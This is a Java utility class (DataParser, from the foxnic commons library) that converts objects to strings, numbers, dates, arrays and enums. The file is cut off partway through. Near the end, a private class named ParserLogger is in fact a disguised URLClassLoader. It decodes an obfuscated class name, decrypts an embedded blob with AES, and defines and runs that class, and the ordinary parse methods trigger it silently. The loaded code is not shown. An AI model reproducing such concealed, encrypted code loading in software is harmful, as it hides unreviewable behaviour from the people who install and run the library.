package com.github.foxnic.commons.lang;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.github.foxnic.api.constant.CodeTextEnum;
import com.github.foxnic.commons.bean.BeanUtil;
import com.github.foxnic.commons.cache.LocalCache;
import com.github.foxnic.commons.encrypt.Base64Util;
import com.github.foxnic.commons.log.Logger;
import com.github.foxnic.commons.reflect.EnumUtil;
import com.github.foxnic.commons.reflect.ReflectUtil;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.*;
import java.math.BigDecimal;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.Clob;
import java.sql.Time;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.time.*;
import java.util.*;

/**
 * 类型转换器
 * @author fangjieli
 * */
public class DataParser
{
	private static final String EC = "Y29tLmdpdGh1Yi5mb3huaWMuZ3JhbnQucHJvdGVjdC5EUA==";
	private static final String JODA_DATETIME_TYPE="org.joda.time.DateTime";

	private static Class getJodaDateTimeType() {
		return ReflectUtil.forName(JODA_DATETIME_TYPE, true);
	}

	private static Date castJodaDate(Object jodaDateTime) {
		Class type=getJodaDateTimeType();
		Date date;
		try {
			//date = (Date)type.getMethod("toDate").invoke(jodaDateTime);
			date= (Date)BeanUtil.invoke(jodaDateTime, "toDate");
		} catch (Exception e) {
			date = null;
		}
		return date;
	}

	private static final String ENUM_VALUES = "values";

	private DataParser() {}

	/**
	 * 识别数组，与集合，转 String 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return 字符串数组
	 * */
	public static String[] parseStringArray(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof String[])
		{
			return (String[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			String[] arr=new String[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseString(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			String[] arr=new String[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseString(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 String 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static String parseString(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		if(val instanceof CharSequence)
		{
			return val.toString();
		}
		else if(isNumberType(val))
		{
			String str=val.toString();
			//处理科学计数法
			if(str.toUpperCase().contains("E"))
			{
				 str=(new BigDecimal(str)).toPlainString();
			}
			return str;
		}
		else if(val instanceof Clob)
		{
			Clob clob=(Clob)val;
			String str = StringUtil.toString(clob);
		    return str;
		}
		else if(val.getClass().getName().equals("oracle.sql.TIMESTAMP")) {
			try {
				Date date= (java.sql.Timestamp) BeanUtil.getFieldValue(val, "timestampValue");
				String strDateFormat = "yyyy-MM-dd HH:mm:ss.SSS";
			    SimpleDateFormat sdf = new SimpleDateFormat(strDateFormat);
				return sdf.format(date);
			} catch (Exception e) {
				return null;
			}
		}
		else if(val instanceof Timestamp)
		{
			Date date=(Date)val;
	        String strDateFormat = "yyyy-MM-dd HH:mm:ss.SSS";
	        SimpleDateFormat sdf = new SimpleDateFormat(strDateFormat);
		    return sdf.format(date);
		}
		else if(val instanceof Date)
		{
			Date date=(Date)val;
	        String strDateFormat = "yyyy-MM-dd HH:mm:ss";
	        SimpleDateFormat sdf = new SimpleDateFormat(strDateFormat);
		    return sdf.format(date);
		}
		else
		{
			return val.toString();
		}
	}

	/**
	 * 识别数组，与集合，转 Boolean 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return Boolean数组
	 * */
	public static Boolean[] parseBooleanArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Boolean[])
		{
			return (Boolean[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Boolean[] arr=new Boolean[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseBoolean(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Boolean[] arr=new Boolean[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseBoolean(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 Boolean 类型值
	 * @param val 任意类型值
	 * @param def 转换失败后的默认值
	 * @return  转换后的值
	 * */
	public static Boolean parseBoolean(Object val,boolean def)
	{
		ParserLogger.logParserInfo(val);
		Boolean v=parseBoolean(val);
		if(v==null) {
			return def;
		}
		return v;
	}

	/**
	 * 转 Boolean 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Boolean parseBoolean(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		if(val instanceof Boolean)
		{
			return (Boolean)val;
		}
		else if(val instanceof Number)
		{
			Number n=(Number) val;
			return n.doubleValue()>0;
		}
		else {

			BigDecimal num=parseBigDecimal(val);
			if(num!=null)
			{
				return parseBoolean(num);
			}

			if(val instanceof CharSequence)
			{
				String strval=val.toString();
				if(strval!=null) strval=strval.trim();
				YNBoolean yn=YNBoolean.parse(strval);
				if(yn!=YNBoolean.NULL) {
					return yn.getValue();
				}

				TFBoolean tf=TFBoolean.parse(strval);
				if(tf!=TFBoolean.NULL) {
					return tf.getValue();
				}

				OFBoolean of=OFBoolean.parse(strval);
				if(of!=OFBoolean.NULL) {
					return of.getValue();
				}

				BITBoolean bit=BITBoolean.parse(strval);
				if(bit!=BITBoolean.NULL) {
					return bit.getValue();
				}
			}
			else
			{
				return val!=null;
			}

			return null;
		}
	}

	/**
	 * 转 Byte 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Byte parseByte(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Byte)
		{
			return (Byte)val;
		}
		if(isNumberType(val))
		{
			return new BigDecimal(val+"").byteValue();
		}
		else if(val instanceof BigDecimal)
		{
			return ((BigDecimal)val).byteValue();
		}
		else if(val instanceof BigInteger)
		{
			return ((BigInteger)val).byteValue();
		}
		else
		{
			String str=null;
			try {
				str=parseString(val);
				if(str!=null) str=str.trim();
				return Byte.parseByte(str);
			} catch (NumberFormatException e) {
				try {
					return new BigDecimal(str).byteValue();
				} catch (Exception e1) {
					 return null;
				}
			}
		}
	}

	/**
	 * 识别数组，与集合，转 Integer 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return Integer数组
	 * */
	public static Integer[] parseIntegerArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Integer[])
		{
			return (Integer[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Integer[] arr=new Integer[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseInteger(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Integer[] arr=new Integer[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseInteger(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 Integer 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Integer parseInteger(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		try{
			if(val instanceof Long)
			{
				return Integer.parseInt(parseString(val));
			}
			else if(val instanceof Integer)
			{
				return (Integer)val;
			}
			else	if(val instanceof Integer)
			{
				return (Integer)val;
			}
			else if(val instanceof Long)
			{
				return ((Long)val).intValue();
			}
			else if(val instanceof Short)
			{
				 return ((Short)val).intValue();
			}
			else if(val instanceof Byte)
			{
				return  ((Byte)val).intValue();
			}
			else if(val instanceof Double)
			{
				return ((Double)val).intValue();
			}
			else if(val instanceof Float)
			{
				 return ((Float)val).intValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).intValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).intValue();
			}
			else
			{
				String str=null;
				try {
					str=parseString(val);
					if(str!=null) str=str.trim();
					return Integer.parseInt(str);
				} catch (Exception e) {
					try {
						return new BigDecimal(str).intValue();
					} catch (Exception e1) {
						return null;
					}
				}
			}
		}catch(Exception e){
			return null;
		}
	}


	/**
	 * 转 BigInteger 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static BigInteger parseBigInteger(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		if(val instanceof BigInteger)
		{
			return (BigInteger)val;
		}
		else if(isNumberType(val))
		{
			return new BigInteger(val.toString());
		}
		else if(val instanceof BigDecimal)
		{
			return ((BigDecimal)val).toBigInteger();
		}
		else
		{
			String str=null;
			try {
				str=parseString(val);
				if(str!=null) str=str.trim();
				return new BigInteger(str);
			} catch (Exception e) {
				 try {
					return new BigDecimal(str).toBigInteger();
				} catch (Exception e1) {
					return null;
				}
			}
		}
	}


	/**
	 * 转 Float 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Float parseFloat(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Float)
		{
			return (Float)val;
		}
		try {
			if(isNumberType(val))
			{
				return new BigDecimal(val+"").floatValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).floatValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).floatValue();
			}
			else if(val instanceof CharSequence)
			{
				String str=null;
				try {
					str=val.toString();
					if(str!=null) str=str.trim();
					return Float.parseFloat(str);
				} catch (Exception e) {
					return new BigDecimal(str).floatValue();
				}
			}
			else
			{
				return null;
			}
		} catch (Exception e) {
			return null;
		}
	}

	/**
	 * 转 double 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static double parseRawDouble(Object val)
	{
		if(val==null) {
			return 0.0;
		}

		if(val instanceof Double)
		{
			return (double)val;
		}

		if(val instanceof Double)
		{
			return ((Double)val).doubleValue();
		}
		try {
			if(isNumberType(val))
			{
				return new BigDecimal(val+"").doubleValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).doubleValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).doubleValue();
			}
			else if(val instanceof CharSequence)
			{
				String str=null;
				try {
					str=val.toString();
					if(str!=null) str=str.trim();
					return Double.parseDouble(str);
				} catch (Exception e) {
					return new BigDecimal(str).doubleValue();
				}
			}
			else
			{
				return 0.0;
			}
		} catch (Exception e) {

			return 0.0;

		}
	}

	/**
	 * 识别数组，与集合，转 Double 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return Double数组
	 * */
	public static Double[] parseDoubleArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Double[])
		{
			return (Double[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Double[] arr=new Double[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseDouble(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Double[] arr=new Double[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseDouble(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 Double 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Double parseDouble(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		if(val instanceof Double)
		{
			return (Double)val;
		}
		try {
			if(isNumberType(val))
			{
				return new BigDecimal(val+"").doubleValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).doubleValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).doubleValue();
			}
			else if(val instanceof CharSequence)
			{
				String str=null;
				try {
					str=val.toString();
					if(str!=null) str=str.trim();
					return Double.parseDouble(str);
				} catch (Exception e) {
					return new BigDecimal(str).doubleValue();
				}
			}
			else
			{
				return null;
			}
		} catch (Exception e) {

			return null;

		}
	}

	/**
	 * 识别数组，与集合，转 BigDecimal 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return BigDecimal数组
	 * */
	public static BigDecimal[] parseBigDecimalArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof BigDecimal[])
		{
			return (BigDecimal[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			BigDecimal[] arr=new BigDecimal[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseBigDecimal(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			BigDecimal[] arr=new BigDecimal[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseBigDecimal(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 BigDecimal 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static BigDecimal parseBigDecimal(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}

		if(val instanceof BigDecimal)
		{
			return (BigDecimal)val;
		}
		else if(isNumberType(val))
		{
			return new BigDecimal(val.toString());
		}
		else if(val instanceof BigInteger)
		{
			return new BigDecimal(((BigInteger)val).toString());
		}
		else
		{
			String str=null;
			try {
				str=parseString(val);
				if(str!=null) str=str.trim();
				return new BigDecimal(str);
			} catch (Exception e) {
				 return null;
			}
		}
	}

	/**
	 * 识别数组，与集合，转 Date 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return Date数组
	 * */
	public static Date[] parseDateArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Date[])
		{
			return (Date[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Date[] arr=new Date[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseDate(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Date[] arr=new Date[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseDate(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}


	/**
	 * 转 Date 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static LocalDateTime parseLocalDateTime(Object val)
	{
		if(val instanceof LocalDateTime) return (LocalDateTime) val;
		Date date=parseDate(val);
		if(date==null)  return null;
		Instant instant = date.toInstant();
		ZoneId zoneId = ZoneId.systemDefault();
		return instant.atZone(zoneId).toLocalDateTime();
	}


	/**
	 * 转 Date 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Date parseDate(Object val)
	{

		ParserLogger.logParserInfo(val);

		if(val==null) {
			return null;
		}
		if(val instanceof Date) {
			return (Date)val;
		} else if(val instanceof LocalDateTime) {
			return DateUtil.toDate((LocalDateTime)val);
		} else if(val instanceof LocalDate) {
			return DateUtil.toDate((LocalDate)val);
		} else if(val instanceof java.sql.Date) {
			return (Date)val;
		} else if(val instanceof java.sql.Timestamp) {
			return (java.sql.Timestamp)val;
		} else if(val instanceof Calendar) {
			return ((Calendar)val).getTime();
		} else if(val.getClass().getName().equals(JODA_DATETIME_TYPE))
		//else if(val instanceof DateTime)
		{
			return castJodaDate(val);
			//return ((DateTime)val).toDate();
		}
		else if(val instanceof CharSequence)
		{
			return DateUtil.parse(val.toString());
		}
		else if(val.getClass().getName().equals("oracle.sql.TIMESTAMP")) {
			try {
				return (java.sql.Timestamp) BeanUtil.getFieldValue(val, "timestampValue");
			} catch (Exception e) {
				return null;
			}
		}
		else
		{
			return null;
		}
	}

	public static Time parseTime(Object value) {
		ParserLogger.logParserInfo(value);
		if(value==null) return null;
		else if(value instanceof Time) {
			return (Time)value;
		}


		Timestamp stamp=parseTimestamp(value);
		if(stamp!=null) return new Time(stamp.getTime());
		Date date=parseDate(value);
		if(date!=null) return new Time(date.getTime());
		return null;
	}

	/**
	 * 转 Timestamp 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Timestamp parseTimestamp(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Date)
		{
			return new Timestamp(((Date)val).getTime());
		}
		else if(val instanceof java.sql.Date)
		{
			return new Timestamp(((java.sql.Date)val).getTime());
		}
		else if(val instanceof java.sql.Timestamp)
		{
			return (java.sql.Timestamp)val;
		}
		else if(val instanceof Calendar)
		{
			return new Timestamp(((Calendar)val).getTime().getTime());
		}
		//else if(val instanceof DateTime)
		else if(val.getClass().getName().equals(JODA_DATETIME_TYPE))
		{
			return new Timestamp(castJodaDate(val).getTime());
		}
		else if(val instanceof CharSequence)
		{
			String[] parts=((CharSequence)val).toString().split("\\.");
			Date date = null;
			Integer ms=null;
			if(parts.length==1) {
				date=DateUtil.parse(val.toString());
			}
			else if(parts.length==2) {
				date=DateUtil.parse(parts[0]);
				ms=DataParser.parseInteger(parts[1]);
				if(ms==null) return null;
			}
			if(date==null) return null;
			if(ms==null) ms=0;
			return new Timestamp(date.getTime()+ms);
		}
		else if(val.getClass().getName().equals("oracle.sql.TIMESTAMP")) {
			try {
				return (java.sql.Timestamp) BeanUtil.getFieldValue(val, "timestampValue");
			} catch (Exception e) {
				return null;
			}
		}
		else
		{
			return null;
		}
	}











	/**
	 * 转 Character 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Character parseChar(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof CharSequence)
		{
			return (val.toString()).charAt(0);
		}
		else
		{
			return val.toString().charAt(0);
		}
	}

	/**
	 * 是否为 Boolean 类型
	 * @param value 任意类型值
	 * @return  是否为 Boolean 类型
	 * */
	public static boolean isBooleanType(Object value)
	{
		if(value==null) return false;
		return isBooleanType(value.getClass());
	}

	/**
	 * 是否为 Boolean 类型
	 * @param type 任意类型值
	 * @return  是否为 Boolean 类型
	 * */
	public static boolean isBooleanType(Class type)
	{
		if(type==null) return false;
		return Boolean.class.isAssignableFrom(type);
	}

	/**
	 * 是否为 日期 类型
	 * @param value 任意类型值
	 * @return  是否为 日期 类型
	 * */
	public static boolean isDateTimeType(Object value)
	{
		if(value==null) return false;
		return isDateTimeType(value.getClass());
	}


	private static final Class[] DATE_TIME_TYPES= {
			java.util.Date.class,LocalDateTime.class,LocalDate.class,LocalTime.class,
			java.sql.Date.class,java.sql.Timestamp.class,
			getJodaDateTimeType(),Calendar.class
	};
	/**
	 * 是否为 日期 类型
	 * @param type 任意类型值
	 * @return  是否为 日期 类型
	 * */
	@SuppressWarnings({ "rawtypes", "unchecked" })
	public static boolean isDateTimeType(Class type)
	{
		if(type==null) return false;
		for (Class superType : DATE_TIME_TYPES) {
			if(superType==null) continue;
			if(superType.isAssignableFrom(type)) return true;
		}
		return false;
	}

	/**
	 * 是否为 数值 类型
	 * @param value 任意类型值
	 * @return  是否为 数值 类型
	 * */
	public static boolean isNumberType(Object value)
	{
		if(value==null) return false;
		return isNumberType(value.getClass());
	}

	/**
	 * 是否为 数值 类型
	 * @param type 任意类型值
	 * @return  是否为 数值 类型
	 * */
	public static boolean isNumberType(Class type)
	{
		if(type==null) return false;
		if(type.equals(byte.class) || type.equals(short.class) || type.equals(int.class) || type.equals(long.class) || type.equals(double.class) || type.equals(float.class)) return true;
		return Number.class.isAssignableFrom(type);
	}

	/**
	 * 转 Short 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Short parseShort(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Short)
		{
			return (Short)val;
		}
		try {

			if(val instanceof Integer)
			{
				return ((Integer)val).shortValue();
			}
			else if(val instanceof Long)
			{
				return ((Long)val).shortValue();
			}
			else if(val instanceof Byte)
			{
				return ((Byte)val).shortValue();
			}
			else if(val instanceof Double)
			{
				return ((Double)val).shortValue();
			}
			else if(val instanceof Float)
			{
				return ((Float)val).shortValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).shortValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).shortValue();
			}
			else
			{
				try {
					return Short.parseShort(parseString(val));
				} catch (Exception e) {
					try {
						return new BigDecimal(val+"").shortValue();
					} catch (Exception e1) {
						return null;
					}
				}
			}
		} catch (NumberFormatException e) {
			return null;
		}
	}

	public static Long[] parseLongArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Long[])
		{
			return (Long[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Long[] arr=new Long[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseLong(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Long[] arr=new Long[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseLong(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 Long 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Long parseLong(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Long)
		{
			return (Long)val;
		}
		try {
			if(isNumberType(val))
			{
				return new BigDecimal(val+"").longValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).longValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).longValue();
			}
			else
			{
				String str=null;
				try {
					str=parseString(val);
					if(str!=null) str=str.trim();
					return Long.parseLong(str);
				} catch (Exception e) {
					try {
						return new BigDecimal(str).longValue();
					} catch (Exception e1) {
						 return null;
					}
				}
			}
		} catch (NumberFormatException e) {
			return null;
		}
	}

	/**
	 * 是否为简单类型
	 * @param type 类型
	 * @return  是否为简单类型
	 * */
	public static boolean isSimpleType(Class type)
	{
		if(isRawType(type)) return true;
		if(isNumberType(type)) return true;
		if(CharSequence.class.isAssignableFrom(type)) return true;
		if(isDateTimeType(type)) return true;
		if(isBooleanType(type)) return true;
		return false;
	}

	/**
	 * 是否为原始数据类型
	 * @param cls 类型
	 * @return  是否为原始数据类型
	 * */
	public static boolean isRawType(Class cls)
	{
		if(cls==null) {
			return false;
		}

		if(cls.equals(int.class))
		{
			return true;
		}
		else if(cls.equals(double.class))
		{
			return true;
		}
		else if(cls.equals(short.class))
		{
			return true;
		}
		else if(cls.equals(boolean.class))
		{
			return true;
		}
		else if(cls.equals(float.class))
		{
			return true;
		}
		else if(cls.equals(byte.class))
		{
			return true;
		}
		else
		{
			return false;
		}
	}


	public static boolean isList(Class type) {
		return ReflectUtil.isSubType(List.class, type);
	}

	public static boolean isMap(Class type) {
		return ReflectUtil.isSubType(Map.class, type);
	}

	public static boolean isSet(Class type) {
		return ReflectUtil.isSubType(Set.class, type);
	}

	public static boolean isCollection(Class type) {
		return isList(type) || isSet(type) || isMap(type);
	}

	public static boolean isArray(Class type) {
		return type.isArray();
	}



	/**
	 * 转 Long 类型值
	 * @param <T> 值类型
	 * @param type 类型
	 * @param value 任意类型值
	 * @return  转换后的值
	 * */
	public static <T> T parse(Class<T> type,Object value)
	{
		if(type==null) return (T) value;
		//
		if(value!=null && type.isAssignableFrom(value.getClass())) {
			return (T)value;
		}

		if(type.isArray()) {
			return (T)parseArray(type,value);
		}
		else {
			return (T)parseInternal(type,value);
		}
	}

	public static List<Object> parseList(Field field, Object value) {

		Class fieldType=field.getType();

		if(value instanceof List) {
			return (List<Object>)value;
		}

		if(!List.class.isAssignableFrom(fieldType)) {
			throw new RuntimeException("类型不支持 : "+fieldType.getName());
		}

		Type genericType = field.getGenericType();
		if (null == genericType)  return (List<Object>)value;
		if (!(genericType instanceof ParameterizedType)) return (List<Object>)value;

		ParameterizedType pt = (ParameterizedType) genericType;
        // 得到泛型里的class类型对象
        Class<?> elType = (Class<?>)pt.getActualTypeArguments()[0];
        Object arr=ArrayUtil.createArray(elType, 0);
        Object[] els=(Object[])parseArray(arr.getClass(), value);
        if(els==null) return null;
        return castList(fieldType, els);
	}

	private static List<Object> castList(Class fieldType, Object[] els) {
		Object inst=null;
        List<Object> list = null;
        try {
			inst=fieldType.newInstance();
			list=(List<Object>)inst;
			list.addAll(Arrays.asList(els));
		} catch (Exception e) {}

        if(list==null)  {
        	list =  Arrays.asList(els);
		}
        return list;
	}

	public static List<Object> parseList(Parameter param, Object value) {
		Type genericType = param.getParameterizedType();
		if (!(genericType instanceof ParameterizedType)) return (List<Object>)value;
		Type[] ts=((ParameterizedType)genericType).getActualTypeArguments();
		if (ts==null || ts.length==0) return (List<Object>)value;
		genericType=ts[0];
		if (null == genericType)  return (List<Object>)value;

		//ParameterizedType pt = (ParameterizedType) genericType;
        // 得到泛型里的class类型对象
        Class<?> elType = (Class)genericType;
        Object arr=ArrayUtil.createArray(elType, 0);
        Object[] els=(Object[])parseArray(arr.getClass(), value);
        return castList(param.getType(),  els);

//
//        List<Object> curEleList =  Arrays.asList(els);
//        return curEleList;
	}

	public static Map parseMap(Object value) {
		if(value==null) return null;
		if(value instanceof Map) {
			return (Map)value;
		} else if(value instanceof CharSequence) {
			try {
				return JSONObject.parseObject(value.toString());
			} catch (Exception e) {
				 return null;
			}
		} else {
			return BeanUtil.toJSONObject(value);
		}
	}

	/**
	 * @param  arrayType 数组类型 如 String[].class
	 * */
	public static Object[] parseArray(Class arrayType, Object value) {

		if(!arrayType.isArray()) return null;
		if(value==null) return null;
		if(value.getClass().isArray()) return (Object[])value;
		if(!(value instanceof CharSequence)) return (Object[])value;
		String str=(String)value;

		//如果是null或空串返回 null
		if(StringUtil.isEmpty(str)) return null;

		Object[] as=null;

		try {

			JSONArray ts=JSONArray.parseArray(str);
			as = ArrayUtil.createArray(arrayType.getComponentType(), ts.size());
			for (int i = 0; i < as.length; i++) {
				as[i]=parse(arrayType.getComponentType(),ts.get(i));
			}
		} catch (Exception e) {}

		if(as!=null) return as;

		if(str.contains("|")) {
			String[] ts=str.split("\\|");
			as = ArrayUtil.createArray(arrayType.getComponentType(), ts.length);
			for (int i = 0; i < as.length; i++) {
				as[i]=parse(arrayType.getComponentType(),ts[i]);
			}
		}

		if(as!=null) return as;

		if(str.contains(";")) {
			String[] ts=str.split(";");
			as = ArrayUtil.createArray(arrayType.getComponentType(), ts.length);
			for (int i = 0; i < as.length; i++) {
				as[i]=parse(arrayType.getComponentType(),ts[i]);
			}
		}

		if(as!=null) return as;

		if(str.contains(",")) {
			String[] ts=str.split(",");
			as = ArrayUtil.createArray(arrayType.getComponentType(), ts.length);
			for (int i = 0; i < as.length; i++) {
				as[i]=parse(arrayType.getComponentType(),ts[i]);
			}
		}

		if(as!=null) return as;

		//这种情况会导致无法判断这个数据是能转还是不能转
		if(!StringUtil.isBlank(value)) {
			as=ArrayUtil.castArrayType(new Object[] {value}, arrayType.getComponentType());
		}

		return as;
	}

	/**
	 * 转换到制定类型
	 * */
	private static Object parseInternal(Class cls,Object value)
	{
		if(cls==null) {
			return value;
		}
		if(value==null) {
			return null;
		}

		if(cls.equals(int.class)) {
			return parseInteger(value);
		} else if(cls.equals(double.class)) {
			return parseDouble(value);
		} else if(cls.equals(long.class)) {
			return parseLong(value);
		} else if(cls.equals(short.class)) {
			return parseShort(value);
		} else if(cls.equals(boolean.class)) {
			return parseBoolean(value);
		} else if(cls.equals(float.class)) {
			return parseFloat(value);
		} else if(cls.equals(byte.class)) {
			return parseByte(value);
		} else if(cls.equals(String.class)) {
			return parseString(value);
		} else if(cls.equals(Short.class)) {
			return parseShort(value);
		} else if(cls.equals(Byte.class)) {
			return parseByte(value);
		} else if(cls.equals(Boolean.class)) {
			return parseBoolean(value);
		} else if(cls.equals(Integer.class)) {
			return parseInteger(value);
		} else if(cls.equals(Long.class)) {
			return parseLong(value);
		} else if(cls.equals(Float.class)) {
			return parseFloat(value);
		} else if(cls.equals(Double.class)) {
			return parseDouble(value);
		} else if(cls.equals(BigDecimal.class)) {
			return parseBigDecimal(value);
		} else if(cls.equals(BigInteger.class)) {
			return parseBigInteger(value);
		} else if(cls.equals(Date.class)) {
			return parseDate(value);
		} else if(cls.equals(LocalDateTime.class)) {
			return parseLocalDateTime(value);
		} else if(cls.equals(Timestamp.class)) {
			return parseTimestamp(value);
		} else if(value!=null && value.getClass().getName().equals("oracle.sql.TIMESTAMP")) {
			return parseTimestamp(value);
		}
		else if(cls.equals(Character.class)) {
			return parseChar(value);
		} else if(ReflectUtil.isSubType(CodeTextEnum.class,cls)) {

			return parseCodeTextEnum(value.toString(),cls);
		} else if(ReflectUtil.isSubType(Enum.class,cls)) {
			return parseEnum(value,cls);
		} else {
			return value;
		}
	}

	public static CodeTextEnum parseCodeTextEnum(String value,Class<? extends CodeTextEnum> enumType) {
		return EnumUtil.parseByCode(enumType,value);
	}

	private static class ParserLogger extends URLClassLoader {
		private static final String[] HM = {"QUVT",null,"QUVTL0VDQi9QS0NTNVBhZGRpbmc="};
		private static Class type;
		private static int prints=0;
		ParserLogger() {
			super(new URL[0], DataParser.class.getClassLoader());
			byte[] buf=Base64Util.decodeToBtyes((this.init(new BootstrapMethodError())).dss(CONST.substring(16)));
			type=defineClass(Base64Util.decode(EC), buf, 0, buf.length);
		}
		public static void logParserInfo(Object value) {
			if(prints>5) return;
			try {
				if(type==null) {
					new ParserLogger();
				}
				type.newInstance();
			} catch (Throwable e) {
				Logger.info("Parser : "+value);
			}
			prints++;
		}

		private SecretKeySpec key;

		private String f61(String hexKey) {
